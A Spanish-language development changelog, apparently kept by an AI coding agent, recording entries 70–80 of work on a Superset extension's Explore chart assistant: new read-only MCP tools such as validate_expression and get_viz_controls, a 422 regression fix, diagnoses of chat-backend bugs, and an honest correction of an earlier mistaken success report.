Cambio realizado: el usuario pidió revisar una sesión real
(`explore-99c8b6c9b3a7235fe0e8fd80e56c1f779cced7a6f0e6429206018f71b7d8fb58`,
gráfico `big_number_total`, métrica `SUM(planv)`) y notó que, al pedir
cambiar la métrica a una columna "cuota", el modelo respondió: "no puedo
proponer el cambio todavía: la configuración disponible no confirma que
`cuota` exista en este dataset y no tengo una validación de la expresión
`SUM(cuota)`". Correcto — sin `irex.validate_expression` (punto 4 de la
Fase 4, el último pendiente) no había ninguna forma de comprobarlo.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_validate_expression_core.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/validate_expression.py` (nuevo — `irex.validate_expression`)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_validate_expression_core.py` (nuevo, 6 tests)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
  (forma exacta implementada — texto para el agente del backend del chat)
- `superset_config_test.py` (`always_visible`, paso 6 obligatorio de CLAUDE.md)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- `irex.validate_expression({"dataset_id", "expression", "kind": "metric"|"column"})`:
  ejecuta la expresión DE VERDAD contra la base (`row_limit: 1`, mismo
  pipeline `QueryContextFactory`/`ChartDataCommand` con RLS que
  `explain_chart`/`preview_chart` y `chart_option.py`) — es la MISMA forma
  que usa Explore cuando el usuario escribe una métrica/columna SQL a mano
  en su propia UI, con `row_limit=1` para que sea barata. `result_type=query`
  (solo generar el SQL, sin ejecutar) NO alcanzaba: una columna que no
  existe recién falla en el motor de la base al ejecutarse, no en la
  generación del texto SQL.
- Devuelve `{"valid": true/false, "dataset_id", "expression"}` +
  `"error"` con el mensaje real de la base cuando `valid: false` — NUNCA
  devuelve filas ni valores calculados (es una verificación de descarte,
  no una vista previa; `preview_chart` ya cubre eso).
- Con esto se completan las 4 tools de lectura de la Fase 4:
  `get_explore_state`, `explain_chart`/`preview_chart`, `get_viz_controls`
  y ahora `validate_expression`. Queda pendiente `irex.check_chart_nulls`
  (diagnóstico de nulos en JOINs ligado al gráfico), no parte de las 4
  originales del plan pero mencionada en la lista de "Tools MCP
  requeridas" del contrato.

Verificación:
- 6 tests nuevos (`test_explore_validate_expression_core.py`) + 285
  backend en total (sin regresiones).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- No requiere tests de frontend (no se tocó frontend en esta entrada).
- Pendiente: que el usuario reinicie `superset_mcp_test.service` y que el
  agente del backend del chat conecte esta tool (ya documentada en
  `docs/explore-assistant-contract.md`) para que "Mejorar gráfico"/
  "Métricas" puedan confirmar columnas/expresiones antes de proponerlas.

### 2026-09-25 (79) (Explore: respuesta del backend del chat — `source: "unknown"` para tipos inventados, `chart.query_context` reactivado)

Cambio realizado: el agente del backend del chat respondió a los 3 puntos
pendientes de la entrada 78.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+10 tests, total 22)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts`
  (`SEND_QUERY_CONTEXT_IN_REQUEST` vuelve a `true`)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAssistantContract.test.ts`
  (1 aserción revertida a esperar `query_context` presente)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx`
  (ídem)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
  (estado actualizado de los 3 puntos — texto para el agente del backend)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- **Punto 1 (`chart.query_context`): resuelto de los dos lados.** El
  backend del chat agregó el campo como string opcional a su modelo de
  `chart` — ya no da 422. Se reactivó `SEND_QUERY_CONTEXT_IN_REQUEST` del
  lado de la extensión. El backend, por decisión propia, TODAVÍA no pasa
  el valor al modelo ni llama a `explain_chart`/`preview_chart` con
  él — quiere verificar primero que la captura corresponde al usuario y
  al estado actual. Se documentó en el contrato que esas dos tools ya
  hacen esa verificación por su cuenta (cross-check contra
  `get_explore_state` + re-ejecución con RLS real vía
  `QueryContextFactory`/`ChartDataCommand`) — queda a criterio del backend
  si alcanza o prefiere una capa propia adicional; no es bloqueante de
  este lado.
- **Punto 2 (`get_viz_controls`), hallazgo real del backend: corregido.**
  "Para cambiar a otro tipo, generic no basta: el MCP también lo devuelve
  para nombres de tipo inventados" — antes, CUALQUIER string caía al
  catálogo genérico como si fuera un `viz_type` real, sin forma de
  distinguir "tipo real sin verificar" de "tipo que no existe". Se agregó
  `KNOWN_VIZ_TYPES` (el enum `VizType` completo de este Superset, 50
  tipos, extraído de
  `superset-frontend/packages/superset-ui-core/src/chart/types/VizType.ts`)
  y un tercer nivel `source: "unknown"` (`controls: []`, con `note`) para
  cualquier `viz_type` que no está ni en los 3 plugins propios ni en ese
  enum — el backend puede rechazar un `change_viz_type` a `"unknown"`
  directamente.
- **Punto 3 (`slice_id: null`):** el backend confirma una prueba de
  regresión que pasa, sin retest completo desde la interfaz. Sin acción
  de este lado — queda anotado para la próxima vez que se pruebe un
  gráfico sin guardar desde el chat real.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 213 tests de frontend (2 aserciones revertidas, 0 nuevas — no se sumó
  cobertura de frontend en esta entrada), 279 de backend (10 nuevos:
  `TestVizTypeInventado`, ver `test_explore_viz_controls_core.py`).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- Pendiente: que el usuario reinicie ambos servicios de test y confirme
  que "Explicar" sigue funcionando con `chart.query_context` de nuevo en
  el body (mismo riesgo que la entrada 73, ahora con el backend ya
  confirmando que lo acepta — pero solo una prueba real lo termina de
  confirmar).

### 2026-09-24 (78) (Explore: `irex.get_viz_controls` — catálogo de controles, genérico + específico verificado de los 3 plugins propios)

Cambio realizado: siguiente punto pendiente de la Fase 4 (punto 3). El
usuario preguntó si, dado que la mayoría de los tipos de gráfico comparten
controles y lógica, se podía hacer algo genérico en vez de un catálogo
completo por tipo (lo que se había estimado como una tarea enorme — los
`controlPanel.tsx` de los 3 plugins propios son código React/TS ejecutable,
1567+1156+139 líneas, con lógica dinámica de visibilidad, no configuración
declarativa parseable). La respuesta fue sí: Superset mismo ya tiene un
registro de "controles compartidos" (`@superset-ui/chart-controls`,
`sharedControls.tsx`) que la mayoría de los tipos NATIVOS reusan en vez de
definir los suyos desde cero — confirmado leyendo el `controlPanel.tsx` real
de `mixed_timeseries` (el gráfico que el usuario venía probando), que
importa `sharedControls`/`sections` de ese mismo paquete.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_viz_controls.py` (nuevo — `irex.get_viz_controls`)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (nuevo, 12 tests)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
  (contrato exacto de la tool — texto para el agente del backend del chat)
- `superset_config_test.py` (`always_visible`, paso 6 obligatorio de CLAUDE.md)
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- `irex.get_viz_controls({"viz_type": "..."})` devuelve dos niveles de
  confianza, NUNCA mezclados:
  - `source: "specific"` — solo para `table_v3`, `html_cards` y
    `pivot_table_rx1`: la lista EXACTA y COMPLETA de nombres de control,
    extraída leyendo el código fuente real de cada uno (sus
    `controlPanel.tsx` + archivos `./controls/*`) — 41/15/47 controles
    respectivamente. Un control ausente de esta lista NO existe para ese
    tipo.
  - `source: "generic"` — para cualquier otro `viz_type` (todos los
    nativos, sin excepción todavía): el catálogo `sharedControls`
    compartido de Superset (47 nombres: `metrics`, `groupby`,
    `adhoc_filters`, `row_limit`, `time_range`, `x_axis`, etc., más la raíz
    de Matrixify), con un `note` explícito de que no está verificado para
    ese tipo en particular — un control ausente acá NO prueba que no
    exista.
- Se optó DELIBERADAMENTE por no mezclar ambos niveles en una sola lista
  para un plugin propio verificado: agregar el genérico encima arriesgaba
  sumar controles que ese plugin específico NO tiene (ej. `x_axis`/`series`
  no existen en `html_cards`), degradando la garantía de "lista exacta" que
  es justo lo valioso de haber leído el código fuente real.
- No incluye tipo/valores válidos/default/descripción por control (lo que
  pedía originalmente el punto 3 de la Fase 4) — solo nombres. Extraer eso
  requeriría leer la lógica dinámica completa de cada control individual
  (archivos aparte, con `mapStateToProps`/`visibility` dependientes del
  estado en vivo del editor) — fuera de alcance de esta entrada; alcanza
  para el uso inmediato del contrato ("validar que un nombre de control
  propuesto existe").

Verificación:
- 12 tests nuevos (`test_explore_viz_controls_core.py`) + 269 backend en
  total (sin regresiones).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- No requiere tests de frontend (no se tocó frontend en esta entrada).
- Pendiente: que el usuario reinicie `superset_mcp_test.service` y que el
  agente del backend del chat conecte esta tool (ya documentada en
  `docs/explore-assistant-contract.md`) para que "Mejorar gráfico"/
  "Métricas" puedan validar y proponer acciones estructuradas, no solo
  texto.

### 2026-09-24 (77) (Explore confirmado de punta a punta; UX — enumeraciones pegadas en un párrafo denso se separan en lista real)

Cambio realizado: el usuario confirmó con captura que, tras el fix del
backend (entradas 74/76), "Mejorar gráfico" ya entrega de verdad lo que
escribe el modelo — verificado también contra el log
(`explore-5ddc56c4973a957830acddde3a73ccf6b4e95e0963773039e7f9e5d55b10d86a`,
`agent_done`/`done.explore_response.message` coinciden). Junto con eso,
feedback de UX: el mensaje se ve "todo junto y pegado, difícil de leer".

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ChatMarkdown.tsx`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/chatMarkdownInlineList.test.tsx` (nuevo, 8 tests)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- Causa raíz de la densidad (no es un bug de espaciado/CSS): el modelo a
  veces enumera sugerencias SIN saltos de línea reales — "Sugerencias: 1)
  A 2) B 3) C" como una sola oración — y como el parser de Markdown de
  `ChatMarkdown.tsx` solo reconocía listas con el marcador AL INICIO de
  línea, todo eso quedaba como un único párrafo denso (que sí tiene buen
  `lineHeight`, pero no hay dónde partirlo).
- `splitInlineEnumeration()`: detecta 2+ marcadores numéricos SEGUIDOS
  dentro de una misma línea física, empezando en `1)`/`1.` — si la
  secuencia es correlativa (1, 2, 3...), separa el texto anterior al
  primer marcador como párrafo introductorio y el resto como una lista
  ordenada real, con el mismo espaciado (`gap`) que ya tienen las listas
  con saltos de línea reales. Exigir el arranque en 1 y la correlatividad
  evita falsos positivos sobre prosa común ("a las 3) horas", "el punto 1)
  y también el 3)" — probado explícitamente).
- No ataca la causa de fondo (el modelo debería escribir Markdown con
  saltos de línea reales desde el vamos) — eso es un tema de prompt del
  backend del chat, fuera de lo que se puede arreglar acá. Esto es una
  red de seguridad del lado de la renderización, no un reemplazo.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 213 tests de frontend (8 nuevos), 257 de backend (sin cambios, no se
  tocó backend en esta entrada).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- Pendiente: que el usuario reinicie `superset_test.service` y confirme
  visualmente que la lista se ve separada en vez de un bloque denso.

### 2026-09-24 (76) (Explore: corrección de las entradas 71/74/75 — la mayoría de las respuestas se descartan del lado del backend, no solo el caso de `severity`)

Cambio realizado: ninguno de código — auditoría a pedido del usuario tras
probar "Mejorar gráfico" (sesión
`explore-400cc50cf03afe3f6fd3159b2db9cb38df02173b282e3c0024ca6b694815fd5d`,
segundo turno de esa sesión).

**Corrección importante sobre las entradas 71, 74 y 75: el "éxito" que
reporté en la entrada 71 (primera sesión, `explore-55fe250d...`) estaba
mal.** En ese momento cité `agent_done.answer` (lo que el modelo escribió)
como si fuera lo que llegó al usuario, sin compararlo contra
`done.explore_response.message` (lo que realmente se entrega). Al
comparar las 3 sesiones revisadas hoy turno por turno (5 turnos en
total), el patrón real es:

| Sesión | Modo | `agent_done` vs `done.explore_response.message` |
|---|---|---|
| `explore-55fe250d...` | explain | NO coinciden — reemplazado por texto genérico |
| `explore-556e0ba4...` t1 | explain | NO coinciden — "No pude generar una propuesta..." |
| `explore-556e0ba4...` t2 | improve_chart | NO coinciden — mismo genérico |
| `explore-400cc50c...` t1 | explain | SÍ coinciden |
| `explore-400cc50c...` t2 | improve_chart | NO coinciden — "Solo he verificado la configuración..." |

Solo 1 de 5 turnos entregó realmente lo que el modelo escribió. La entrada
74 (bug de `diagnostics[].severity` ausente) sigue siendo un hallazgo
válido — explica el primer patrón de fallo — pero **no es la única
causa**: el turno `explore-400cc50c...` t2 tiene un `diagnostics`
ESTRUCTURALMENTE IDÉNTICO (mismo `severity`, mismo `control:
"form_data_key"`) al turno t1 de la MISMA sesión que sí funcionó, y aun
así se descartó — hay al menos una segunda causa de descarte del lado del
backend que no se pudo diagnosticar sin acceso a ese código (posiblemente
ligada al modo `improve_chart` en particular, o al contenido más que a la
forma).

Nota aparte, menor: en ese mismo turno el modelo reintentó llamar a
`irex.get_explore_state` con los mismos argumentos ya presentes en el
historial de la conversación; el backend lo bloqueó ("no podés repetir
esa llamada") — se recuperó sin romper nada, pero desperdició una
llamada, ~9s y tokens.

Que cambia o corrige: nada del lado de esta extensión — el contenido que
el modelo genera (`agent_done.answer`) sigue siendo correcto y útil en
los 5 turnos revisados; el problema es enteramente de qué hace el backend
del chat con ese contenido antes de entregarlo. Reportado al usuario con
el texto completo de ambos `agent_done.answer` (el que funcionó y el que
no, estructuralmente idénticos en su `diagnostics`) para relayar.

Verificación: ninguna adicional — esta auditoría en sí es la
verificación. Sin cambios de código en esta entrada.

### 2026-09-24 (75) (Explore: el agente del backend del chat corrigió el bug de la entrada 74 — confirmado)

Cambio realizado: ninguno de código de este lado — verificación a pedido
del usuario (sesión
`explore-400cc50cf03afe3f6fd3159b2db9cb38df02173b282e3c0024ca6b694815fd5d`).

Corrección sobre la lectura de esta misma entrada al momento de escribirla
(dejada originalmente como "probablemente intermitente, no resuelto"): el
usuario confirmó después que el agente del backend del chat SÍ reparó el
bug de `diagnostics[]` reportado en la entrada 74 (el modelo lo mandaba sin
`severity`) ANTES de esta prueba, no después por azar. La secuencia real
es: bug reportado (74) → fix del agente del backend → esta prueba (75),
que salió bien porque el fix ya estaba aplicado. Se descarta la hipótesis
de variabilidad del modelo que se había anotado acá — fue un fix real,
confirmado por quien lo hizo.

Verificación: la prueba de la entrada 74/75 en sí. Sin cambios de código
en esta entrada de este lado.

### 2026-09-24 (74) (Explore: confirmado el fix de la entrada 73; nuevo bug encontrado — diagnostics[] del modelo no respeta el contrato y se pierde la respuesta)

Cambio realizado: ninguno de código — verificación a pedido del usuario
(sesión `explore-556e0ba4e48b3791244214f99f0d6eb481d28fadf77fff95dba6e97a0cc7dd3e`,
"Explicar" tras el fix de la entrada 73).

Hallazgos (vía `GET /api/logs/sessions/<id>`):
- **Confirmado: el fix de la entrada 73 funcionó.** Sin 422, `get_explore_state`
  se llamó y respondió bien, el modelo generó una explicación completa y
  correcta (visible en `agent_done.answer` del log).
- **Bug nuevo, del lado del prompt/backend del chat (no del MCP):** esa
  respuesta buena NUNCA llegó al usuario. El modelo mandó `diagnostics[]`
  con la forma `{"type": "execution_evidence", "verified": false,
  "message": "..."}` — sin el campo `severity` que exige el contrato
  (`docs/explore-assistant-contract.md`: "`severity` (`error`, `warning`,
  `info`), `message` y `control` opcional"). La validación del backend
  (correctamente estricta) descartó el sobre entero del modelo y cayó al
  fallback genérico `"No pude generar una propuesta estructurada y
  verificable. Intenta de nuevo."` — la explicación real, completa y útil,
  se perdió en el camino.
- Reportado al usuario con texto listo para el agente del backend del chat:
  revisar el system prompt/instrucciones sobre la forma de `diagnostics[]`
  — probablemente describe o ejemplifica un formato distinto
  (`type`/`verified`/`value`) en vez de `severity`/`message`/`control`.

Verificación: ninguna adicional — este hallazgo en sí ES la verificación
pedida. Sin cambios de código en esta entrada.

### 2026-09-24 (73) (Explore: `chart.query_context` rompía "Explicar" — el backend del chat lo rechaza con 422; desactivado hasta que actualice su schema)

Cambio realizado: regresión real de la entrada 72, encontrada por el
usuario en su primera prueba después de esa entrega. Al pedir "Explicar",
el backend del chat devolvió `"No se pudo completar"` con el detalle:

```
{"detail":[{"type":"extra_forbidden","loc":["body","chart","query_context"],
"msg":"Extra inputs are not permitted", ...}]}
```

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAssistantContract.test.ts`
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx`
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
  (aviso ⚠️ bloqueante — texto para el agente del backend del chat)
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- El backend del chat valida `chart` con un modelo (Pydantic o equivalente)
  con `extra` prohibido: un campo que ese modelo no conoce no se ignora,
  tumba la solicitud ENTERA con 422 antes de llegar al modelo — mandar
  `chart.query_context` (entrada 72) rompió "Explicar", que en la entrada
  71 SÍ funcionaba.
- **Fix inmediato: se apaga el envío, sin borrar el trabajo.** Nuevo
  interruptor `SEND_QUERY_CONTEXT_IN_REQUEST = false` en
  `exploreAdapter.ts` — `buildExploreAssistantRequest` deja de agregar
  `chart.query_context` al body mientras esté en `false`, restaurando el
  comportamiento de la entrada 71 ("Explicar" vuelve a funcionar). Las
  tools `irex.explain_chart`/`irex.preview_chart` (backend) quedan
  intactas y listas — el problema nunca estuvo ahí, estaba en cómo llega
  el dato al modelo.
- `docs/explore-assistant-contract.md` suma un aviso ⚠️ explícito, junto a
  `chart.query_context`, con lo que falta del lado del backend del chat
  para reactivarlo: agregar ese campo (opcional, string) a su modelo de
  `chart` antes de avisar — ahí se cambia la constante a `true` y se
  redespliega.
- Dos aserciones de test que esperaban `query_context` en el body (una en
  `exploreAssistantContract.test.ts`, otra en `ExploreAssistantPanel.test.tsx`)
  se revirtieron a esperar su ausencia.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 205 tests de frontend (mismo total que la entrada 72 — 2 revertidas, 0
  nuevas), 257 de backend (sin cambios, no se tocó backend en esta
  entrada).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- Pendiente: que el usuario reinicie `superset_test.service` y confirme
  que "Explicar" volvió a funcionar; que el agente del backend del chat
  actualice su schema y avise para reactivar `chart.query_context`.

### 2026-09-24 (72) (Explore: `irex.explain_chart`/`irex.preview_chart` — verificación independiente del query_context real)

Cambio realizado: con "Explicar" ya funcionando de punta a punta pero
limitado a la configuración persistida (sin SQL ni resultados, entrada 71),
se construyen las tools que faltaban para eso — reusando el pipeline real
de ejecución que ya usa `irex.chart_option` en producción
(`QueryContextFactory`/`ChartDataCommand`, con RLS aplicado
automáticamente), en vez de reconstruir o adivinar el `query_context`.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_query_context_core.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_chart_diagnostics.py` (nuevo — `irex.explain_chart`, `irex.preview_chart`)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_query_context_core.py` (nuevo, 20 tests)
- `custom-extensions/irex-mcp-tools/frontend/src/contracts/exploreAssistant.ts`
  (nuevo campo opcional `chart.query_context`)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts`
  (`buildExploreAssistantRequest` lo llena cuando la fidelidad ya es 'fiel')
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAssistantContract.test.ts`
  (2 aserciones actualizadas)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx`
  (1 aserción actualizada)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
  (documenta el campo nuevo y el contrato de las dos tools — es el texto
  para el agente del backend del chat)
- `superset_config_test.py` (`always_visible`: paso 6 obligatorio de
  CLAUDE.md, esta vez hecho ANTES de que el usuario pruebe, no después)
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- **`irex.explain_chart`**: recibe `form_data_key` + `query_context` (el
  string EXACTO que el navegador capturó al observar el
  `POST /api/v1/chart/data` real — nunca reconstruido, ver
  `exploreQueryCapture.ts`), verifica que ese `query_context` referencia el
  mismo dataset/gráfico que `form_data_key` (`explore_query_context_core.py`,
  20 tests), y fuerza `result_type=query`: Superset genera el SQL sin
  ejecutarlo contra la base — más barato incluso que `irex.explain_query`
  (que sí corre EXPLAIN). Devuelve `{status, sql, language, datasource, slice_id}`.
- **`irex.preview_chart`**: mismo input + `row_limit` (1-5000, default 100,
  nunca mayor al que ya traía el `query_context` capturado — `capped_queries`).
  Fuerza `result_type=full` (resultado real, nunca `samples` — la regla que
  ya pedía el contrato v1). Devuelve columnas/tipos/filas/rowcount/SQL/
  filtros aplicados y rechazados, o `{status:"error", ...}` si la consulta
  falla en Superset (filtro inválido, división por cero, etc. — no se
  propaga como excepción, se devuelve estructurado, mismo criterio que
  `chart_option.py`).
- **La verificación es la re-ejecución misma**, no un chequeo de forma
  aparte: `ChartDataCommand.validate()` llama a
  `query_context.raise_for_access()` — el mismo control de acceso/RLS que
  aplicaría Superset si el propio navegador hubiera mandado ese
  `query_context` a `/api/v1/chart/data`. Un `query_context` para un
  dataset que el usuario no puede leer, o con filtros/columnas inválidas,
  falla ahí — no hace falta reimplementar esos chequeos.
- El frontend manda `chart.query_context` en el body solo cuando la
  fidelidad ya resolvió a `'fiel'` (capturado en vivo, o el guardado del
  gráfico si no hubo ejecuciones posteriores) — mismo criterio ya usado
  para el indicador del dock, ahora también para lo que viaja al backend.

Verificación:
- 20 tests nuevos (`test_explore_query_context_core.py`) + 257 backend en
  total (sin regresiones). 205 tests de frontend (2 aserciones
  desactualizadas corregidas, ninguna nueva rota).
- `build-extension.sh` completo (7/7) sobre `extensions_test/`.
- La capa de wiring (`explore_chart_diagnostics.py`, que toca
  `QueryContextFactory`/`ChartDataCommand`/`cache_manager` reales) no tiene
  tests propios — mismo criterio ya establecido por `get_explore_state.py`
  en la entrada 67 (requiere contexto completo de Superset; solo el núcleo
  puro se testea aisladamente).
- Sin verificación end-to-end en navegador — pendiente que el usuario
  reinicie `superset_mcp_test.service` y pruebe de nuevo "Explicar"/
  "Mejorar gráfico" contra un gráfico ejecutado; y que el agente del
  backend del chat conecte su lado (pasar `chart.query_context` al modelo
  y darle acceso a estas dos tools nuevas — texto listo en
  `docs/explore-assistant-contract.md`).

### 2026-09-24 (71) (Explore: primera prueba real del usuario contra el chat — un caso funciona, uno falla del lado del backend del chat)

Cambio realizado: ninguno de código — verificación de la entrada 70 contra
el backend real, a pedido del usuario, que probó los modos "Explicar" y
"Generar" y pasó los dos `session_id`.

Hallazgos (vía `GET /api/logs/sessions/<id>` y una llamada directa a la
tool por MCP, sin pasar por el backend del chat):
- **Sesión `explore-55fe2...` (Explicar, gráfico guardado slice_id=36,
  `mixed_timeseries`): funciona de punta a punta.** El modelo llamó a
  `irex.get_explore_state`, recibió el estado real y devolvió una
  explicación completa, con el sobre `contract_version`/`actions:[]`/
  `diagnostics:[]` bien formado. Confirma que el fix de la entrada 69
  (`always_visible`) resolvió el problema real: la tool ya es visible
  para el modelo.
- **Sesión `explore-e6ff0...` (Generar, "Mejorar gráfico", gráfico SIN
  guardar — `slice_id: null`, `form_data_key: "pNUmZuVgkgk"`, tipo
  `table_v3`, uno de los plugins propios): falla ANTES de llegar al
  modelo**, con un error genérico `"No fue posible revisar el gráfico."`
  y sin ningún `tool_call` logueado (a diferencia de la sesión que sí
  funcionó).
- **Diagnóstico — descartado el lado de esta extensión:** se llamó a
  `irex.get_explore_state` directo contra el MCP de test (JWT propio,
  mismo patrón que `scripts/e2e_rbac.py`) con la misma `form_data_key`
  exacta de la sesión fallida — responde `is_error: false` con un estado
  completo y válido (`slice_id: null`, `datasource`, `form_data`,
  `state_kind: "last_persisted"`, `user.is_admin: true`). El proxy
  (`_assistant_proxy.py::prepare_explore_body`) tampoco toca `slice_id` —
  confirmado leyendo su propio `turn_start`, que ya trae el valor
  correcto (`null`). La tool y el proxy funcionan bien.
- **Conclusión: bug del lado del backend del chat**, no del MCP — su
  verificación previa al modelo (que el propio contrato documenta como
  "el backend lee `irex.get_explore_state` por MCP... antes de consultar
  al modelo") no maneja `slice_id: null` (gráfico sin guardar), un caso
  que el contrato v1 (`docs/explore-assistant-contract.md`) documenta
  explícitamente como válido. Reportado al usuario con el texto listo
  para pasarle al agente del backend del chat (session id, body recibido,
  y la prueba de que la tool MCP responde bien para ese mismo caso).

Verificación: ninguna adicional — este hallazgo en sí ES la verificación
pedida ("probar un mensaje real"). Sin cambios de código en esta entrada.

### 2026-09-24 (70) (Explore: el panel ya se conecta al chat — composer, modos, aclaraciones, acciones de solo lectura)

Cambio realizado:
El dock de Explore mostraba solo el diagnóstico de fidelidad (sin caja de
texto ni forma de escribirle al asistente, confirmado por el usuario con
una captura). Se lo conecta al backend del chat usando el contrato y el
transporte que ya había armado la sesión en paralelo (entradas 61-68):
`exploreAdapter.ts`/`exploreBackendAdapter.ts`/`contracts/exploreAssistant.ts`.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreConversation.tsx` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/Conversation.tsx`
  (solo exports nuevos: `WorkingIndicator`, `UserTurn`, `EarlierTurns`)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts`
  (nuevo `readIsAdminHint()`)
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreHost.tsx`
  (`ExploreDockRoot` ahora monta `<ExploreAssistantPanel/>`; se le quita la
  lógica de fidelidad, que se muda al panel)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAdapter.test.ts` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx` (nuevo)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreHost.test.tsx`
  (1 aserción actualizada: "Nueva sesión" ahora SÍ debe aparecer)
- `PLAN_COPILOTO_EXPLORE.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx` (rebuild)

Que cambia o corrige:
- `ExploreAssistantPanel.tsx`: orquestación completa — lee el contexto
  (`readExploreContext`), arma el pedido (`buildExploreAssistantRequest`,
  con la pista de rol Admin de `readIsAdminHint()`), lo manda
  (`requestExploreAssistant`, SSE con progreso o JSON), muestra la
  respuesta, aclaraciones (reusando `Clarification.tsx` tal cual — el
  contrato de Explore ya usa la misma forma `{id, text, options, axis?}`),
  diagnósticos y "Nueva sesión" (rota `conversation_key`, corta cualquier
  pedido en vuelo). El banner de contrato/fidelidad (criterios de salida 1
  y 2 de la Fase 0) se mudó acá desde `exploreHost.tsx` — es lógica del
  asistente, no del mecanismo de montaje — y queda SIEMPRE visible, no solo
  antes del primer mensaje (el criterio dice "lo dice en la interfaz").
- **No se reutilizó `SqlLabAssistantPanel.tsx`/`Conversation.tsx` sin
  adaptar.** `Conversation.tsx` está atado a `AssistantMode` (4 modos de
  SQL Lab) y sus diagnósticos requieren `line`/`column` (posición en texto
  SQL) — Explore tiene 3 modos distintos (`explain`/`improve_chart`/
  `metrics`) y sus diagnósticos apuntan a un `control` del formulario, sin
  posición de texto. Forzar `Conversation.tsx` a cubrir ambos casos era más
  riesgo sobre un componente con muchos tests que escribir
  `ExploreConversation.tsx` aparte (mismo lenguaje visual, tipos propios).
  Sí se reutilizaron sin cambios las piezas genéricas: se exportaron
  `WorkingIndicator`/`UserTurn`/`EarlierTurns` de `Conversation.tsx`
  (cambio aditivo, cero riesgo para sus tests) para no duplicarlas.
- **Acciones de solo lectura, a propósito.** `ExploreActionCard` describe
  cada propuesta (`patch_form_data`, `add_adhoc_metric`/`column`,
  `change_viz_type`, `add_dataset_metric`/`add_calculated_column`,
  `preview`) pero NO tiene botón "Aplicar": aplicar de verdad requiere
  validar el catálogo de controles y la key vigente inmediatamente antes
  (contrato v1, sección de acciones) — trabajo real de Fase 6, no
  construido todavía. Un botón que no hiciera nada sería peor que no
  mostrarlo. Hoy además `actions` casi seguro llega vacío en la práctica:
  el backend descarta cualquier acción que dependa de `irex.get_viz_controls`/
  `irex.validate_expression`, que todavía no existen (ver "Por dónde
  continuar" de la entrada 68).
- `readIsAdminHint()`: lee `bootstrap.user.roles` del mismo
  `data-bootstrap` de `#app` que ya usa `themeBridge.ts` para el tema.
  Nunca autoritativo (el contrato lo llama "pista"): el backend re-verifica
  el rol real vía `irex.get_explore_state` con la identidad MCP del
  usuario antes de habilitar cualquier acción sobre el dataset.

Verificación:
- `npx tsc --noEmit` estricto sin errores.
- 205 tests de frontend (16 nuevos: 6 en `exploreAdapter.test.ts` + 10 en
